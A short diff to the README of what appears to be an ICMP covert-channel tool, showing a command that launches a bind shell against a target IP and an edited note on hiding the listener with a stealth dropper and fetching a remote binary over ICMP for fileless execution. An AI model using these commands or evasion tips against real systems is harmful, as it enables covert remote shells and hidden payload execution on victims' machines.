@@ -31,7 +31,7 @@ On both machines you need to have `qssender`and `qsreceiver`
 ./bindshell.sh <ip_target> <ip_listening_for_icmp>
 ```
 
-*Product placement: To be stealthly, you `listener` should use a dropper and hide its presence. You could find a stealth dropper example in [fileless-xec](https://github.com/ariary/fileless-xec) repo. Should I adapt it to use ICMP ? 🤔*
+*Product placement: To be stealthly, you `listener` should use a dropper and hide its presence. You could find a stealth dropper example in [fileless-xec](https://github.com/ariary/fileless-xec) repo. You could stealthy execute a remote binary on local machine using ICMP to retrieve its content*
 
 ### One-liner redirect command output
 
